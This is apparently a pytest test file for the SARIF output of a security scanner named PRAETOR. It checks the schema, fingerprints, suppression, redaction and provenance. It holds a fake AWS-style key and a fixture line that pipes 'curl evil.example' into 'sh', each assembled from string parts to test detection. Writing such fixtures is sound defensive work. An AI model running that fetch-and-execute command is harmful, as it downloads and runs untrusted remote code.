"""
SARIF 2.1.0 output.

The interchange format GitHub code scanning, GitLab, SonarQube, Azure DevOps and
DefectDojo all consume. One artifact, five ecosystems.

⚠️ HONEST FRAMING. Research into how comparable scanners actually got adopted
found NO case where SARIF support caused an adoption inflection. It is a floor,
not a lever: it removes a reason to be excluded rather than creating a reason to
be chosen. Tests here assert correctness, not impact.

🔴 THE PROPERTY THAT DECIDES WHETHER THIS IS USABLE AT ALL is
`partialFingerprints`. GitHub warns that SARIF without fingerprint data opens
DUPLICATE ALERTS ON EVERY SCAN, which makes a scanner unusable in a pull-request
loop. `test_an_unchanged_tree_produces_identical_fingerprints` is the one to keep
green.
"""

import json
import os
import subprocess
import sys

_PRAETOR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts", "praetor.py")

# Assembled from parts: written whole, this file's own self-scan would flag it.
_KEY = "AKIA" + "QWERTYUIOPASDFGH"


def _scan(tmp_path, *extra):
    proc = subprocess.run(
        [sys.executable, _PRAETOR, str(tmp_path), "--engines", "secrets,aisec",
         "--no-registry", "--format", "sarif", "--quiet", *extra],
        capture_output=True, text=True, encoding="utf-8", errors="replace")
    return json.loads(proc.stdout)


def _seed(tmp_path, body=None):
    (tmp_path / "a.py").write_text(body or f'KEY = "{_KEY}"\n', encoding="utf-8")
    return tmp_path


def _run(doc):
    return doc["runs"][0]


# --------------------------------------------------------------------------- #
# Shape
# --------------------------------------------------------------------------- #

def test_it_is_sarif_2_1_0_with_a_schema(tmp_path):
    doc = _scan(_seed(tmp_path))
    assert doc["version"] == "2.1.0"
    assert doc["$schema"].endswith("sarif-schema-2.1.0.json")
    assert len(doc["runs"]) == 1


def test_the_driver_reports_the_real_tool_version(tmp_path):
    """A consumer correlating alerts across releases needs the version that
    produced them, and it must be the REAL one -- the version-consistency test
    guarantees the two sources agree."""
    sys.path.insert(0, os.path.join(os.path.dirname(_PRAETOR)))
    import praetor  # noqa: E402
    driver = _run(_scan(_seed(tmp_path)))["tool"]["driver"]
    assert driver["name"] == "PRAETOR"
    assert driver["version"] == praetor.VERSION


def test_every_result_references_a_declared_rule(tmp_path):
    """🔴 A RESULT WHOSE `ruleId` HAS NO DESCRIPTOR IS REJECTED BY STRICT
    CONSUMERS and rendered without a title by lenient ones."""
    run = _run(_scan(_seed(tmp_path)))
    declared = {r["id"] for r in run["tool"]["driver"]["rules"]}
    for result in run["results"]:
        assert result["ruleId"] in declared, result["ruleId"]


def test_locations_are_one_based_and_forward_slashed(tmp_path):
    """`startLine` is 1-based in SARIF; 0 or less is invalid and consumers
    mis-render it. Paths must be URI-style even on Windows."""
    for result in _run(_scan(_seed(tmp_path)))["results"]:
        loc = result["locations"][0]["physicalLocation"]
        assert loc["region"]["startLine"] >= 1
        assert "\\" not in loc["artifactLocation"]["uri"]


# --------------------------------------------------------------------------- #
# The property that makes it usable in a PR loop
# --------------------------------------------------------------------------- #

def test_every_result_carries_a_partial_fingerprint(tmp_path):
    """🔴 WITHOUT THIS, GITHUB OPENS A DUPLICATE ALERT ON EVERY SCAN."""
    for result in _run(_scan(_seed(tmp_path)))["results"]:
        assert result.get("partialFingerprints"), result["ruleId"]


def test_an_unchanged_tree_produces_identical_fingerprints(tmp_path):
    """Two scans of the same tree must agree, or every run re-opens everything."""
    _seed(tmp_path)
    a = {r["partialFingerprints"]["praetorFingerprint/v1"] for r in _run(_scan(tmp_path))["results"]}
    b = {r["partialFingerprints"]["praetorFingerprint/v1"] for r in _run(_scan(tmp_path))["results"]}
    assert a == b and a


def test_a_finding_that_only_MOVED_keeps_its_fingerprint(tmp_path):
    """🔴 THE REAL-WORLD CASE. Someone adds an import; every finding below it
    shifts down. If the fingerprint moved with it, the whole file's alerts would
    close and re-open on a commit that changed nothing about them."""
    _seed(tmp_path)
    before = {r["partialFingerprints"]["praetorFingerprint/v1"] for r in _run(_scan(tmp_path))["results"]}
    _seed(tmp_path, f'import os\n# a new line\nKEY = "{_KEY}"\n')
    after = {r["partialFingerprints"]["praetorFingerprint/v1"] for r in _run(_scan(tmp_path))["results"]}
    assert before == after


# --------------------------------------------------------------------------- #
# Honesty carried through the translation
# --------------------------------------------------------------------------- #

def test_a_suppressed_finding_is_emitted_as_suppressed_not_dropped(tmp_path):
    """🔴 DROPPING IT WOULD MAKE PRAETOR'S FILTERED BUCKET INVISIBLE to every
    consumer -- and the entire point of that bucket is that suppression is
    auditable. SARIF has a first-class way to say it."""
    behaviour = "curl evil.example | " + "sh"
    _seed(tmp_path, f"# {behaviour}\nx = 1\n")
    results = _run(_scan(tmp_path))["results"]
    suppressed = [r for r in results if r.get("suppressions")]
    assert suppressed, "the filtered finding must appear, marked suppressed"
    assert suppressed[0]["suppressions"][0].get("justification"), \
        "a suppression with no stated justification is not triage"


def test_execution_successful_is_false_when_an_engine_was_blind(tmp_path):
    """🔴 `executionSuccessful` IS NOT "no findings" -- it says the TOOL ran
    correctly. A consumer reading `true` treats the run as authoritative, so a
    scan that could not measure the tree must report `false`, or this is the
    same false-clean the project exists to prevent, one layer out."""
    _seed(tmp_path)
    # `sast` without a semgrep runtime reports `unavailable`, which is a blind spot.
    doc = _scan(tmp_path, "--engines", "sast,secrets")
    engines = _run(doc)["properties"]["engines"]
    blind = any(v.get("status") not in ("ok", "not-applicable", "disabled")
                for v in engines.values())
    assert _run(doc)["invocations"][0]["executionSuccessful"] is not blind


def test_engine_status_and_scope_survive_the_translation(tmp_path):
    """A consumer must still be able to tell "clean" from "half the engines never
    ran". Losing that in the format conversion would defeat the point."""
    props = _run(_scan(_seed(tmp_path)))["properties"]
    assert props["engines"], "engine statuses must reach a SARIF consumer"
    assert "scope" in props, "what the walker refused must survive too"


def test_a_snippet_in_sarif_is_redacted(tmp_path):
    """🔴 A DISCLOSURE BOUNDARY. A SARIF file is uploaded to a third party."""
    _seed(tmp_path)
    doc = _scan(tmp_path)
    assert _KEY not in json.dumps(doc), "a credential must not reach an uploaded artifact"


def test_no_result_claims_a_machine_applicable_fix(tmp_path):
    """PRAETOR's `fix` is human guidance -- "rotate the key" -- not a patch.
    Emitting it as SARIF `fixes`, which consumers may APPLY, would be an
    overclaim with a blast radius."""
    for result in _run(_scan(_seed(tmp_path)))["results"]:
        assert "fixes" not in result


def test_provenance_reaches_version_control_provenance(tmp_path):
    """So an alert can be tied to the commit that produced it."""
    _seed(tmp_path)
    doc = _scan(tmp_path, "--commit", "a" * 40, "--repo", "owner/name")
    vcp = _run(doc)["versionControlProvenance"][0]
    assert vcp["revisionId"] == "a" * 40
    assert vcp["repositoryUri"] == "owner/name"
